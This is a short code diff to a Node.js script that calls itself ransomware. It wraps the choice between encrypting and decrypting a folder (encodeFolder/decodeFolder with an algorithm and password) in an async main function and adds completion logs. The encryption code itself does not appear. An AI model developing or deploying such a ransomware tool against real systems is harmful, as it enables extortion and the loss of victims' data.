@@ -15,14 +15,20 @@ const {
 
 logger.debug(`Starting ransomware, logger in ${process.env.LOGGER_LEVEL} mode`);
 
-try {
-  if (d) {
-    decodeFolder(FOLDER, ALGORITHM, PASSWORD);
-  } else if (e) {
-    encodeFolder(FOLDER, ALGORITHM, PASSWORD);
-  } else {
-    logger.error('Need a --d for decode or --e for encode');
+async function main() {
+  try {
+    if (d) {
+      await decodeFolder(FOLDER, ALGORITHM, PASSWORD);
+      logger.info('Decode done');
+    } else if (e) {
+      await encodeFolder(FOLDER, ALGORITHM, PASSWORD);
+      logger.info('Encode done');
+    } else {
+      logger.error('Need a --d for decode or --e for encode');
+    }
+  } catch (error) {
+    logger.error(error);
   }
-} catch (error) {
-  logger.error(error);
 }
+
+main();
